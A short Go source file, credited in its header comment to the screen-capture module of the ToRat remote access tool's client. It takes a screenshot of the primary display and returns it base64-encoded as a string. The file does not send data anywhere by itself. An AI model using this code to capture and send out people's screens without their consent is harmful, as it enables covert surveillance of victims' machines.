// https://github.com/lu4p/ToRat/blob/master/torat_client/screen/screen.go
// yoink

package commands

import (
	"bytes"
	"encoding/base64"
	"image/png"
	"io/ioutil"
	"log"

	"github.com/kbinani/screenshot"
)

// Take takes a screenshot and returns it as string
func Take() (string, error) {
	// // Make sure to catch the panic if the screenshot function panics because of no display output. (servers, and the like)
	// defer func() {
	// 	if r := recover(); r != nil {
	// 		log.Printf("Recovering from panic in commands/screenshot.go, error is: %v \n", r)
	// 		return "fail", nil
	// 	}
	// }()

	log.Println("Taking Screenshot...")

	bounds := screenshot.GetDisplayBounds(0)

	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		log.Println("Failed to Screenshot!")
		return "", err
	}

	buf := new(bytes.Buffer)
	if err != nil {
		return "", err
	}

	err = png.Encode(buf, img)
	if err != nil {
		return "", err
	}

	readBuf, _ := ioutil.ReadAll(buf)

	encoded := base64.StdEncoding.EncodeToString(readBuf)

	return encoded, nil
}
